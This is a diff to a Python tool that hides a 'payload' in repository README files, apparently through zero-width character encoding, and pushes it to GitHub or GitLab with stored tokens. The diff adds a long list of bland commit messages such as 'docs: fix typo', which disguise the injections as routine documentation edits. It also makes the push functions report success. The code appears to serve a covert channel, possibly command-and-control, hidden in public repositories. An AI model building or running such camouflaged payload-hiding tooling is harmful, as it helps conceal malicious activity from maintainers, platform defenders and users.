@@ -30,6 +30,28 @@ BLAND_COMMITS = [
     "readme: fix formatting",
     "docs: clarify instructions",
     "update project description",
+    "docs: fix broken link",
+    "chore: update readme",
+    "docs: grammar fix",
+    "fix: correct typo",
+    "docs: update installation steps",
+    "readme: add badge",
+    "docs: improve wording",
+    "fix: update outdated reference",
+    "docs: add contributing section",
+    "chore: cleanup readme",
+    "docs: update usage examples",
+    "fix: spelling correction",
+    "docs: reformat code block",
+    "update: project notes",
+    "docs: add FAQ section",
+    "chore: minor text edit",
+    "docs: update version reference",
+    "readme: fix markdown",
+    "docs: remove stale info",
+    "update: license year",
+    "docs: clarify setup steps",
+    "fix: broken markdown link",
 ]
 
 
@@ -275,8 +297,7 @@ def push_to_repo(repo: RepoTarget, config: ControlConfig, payload: bytes, pad: b
                 content = f"# {repo.repo}\n\nProject repository.\n"
                 sha = None
             injected = zwenc.inject(content, payload, pad=pad)
-            github_push_readme(repo, config.github_token, injected, sha)
-            return True
+            return github_push_readme(repo, config.github_token, injected, sha)
 
         elif repo.platform == "gitlab":
             if not config.gitlab_token:
@@ -286,8 +307,7 @@ def push_to_repo(repo: RepoTarget, config: ControlConfig, payload: bytes, pad: b
             if content is None:
                 content = f"# {repo.repo}\n\nProject repository.\n"
             injected = zwenc.inject(content, payload, pad=pad)
-            gitlab_push_readme(repo, config.gitlab_token, injected)
-            return True
+            return gitlab_push_readme(repo, config.gitlab_token, injected)
 
     except Exception as e:
         print(f"  {C.RED}Error: {e}{C.RESET}")
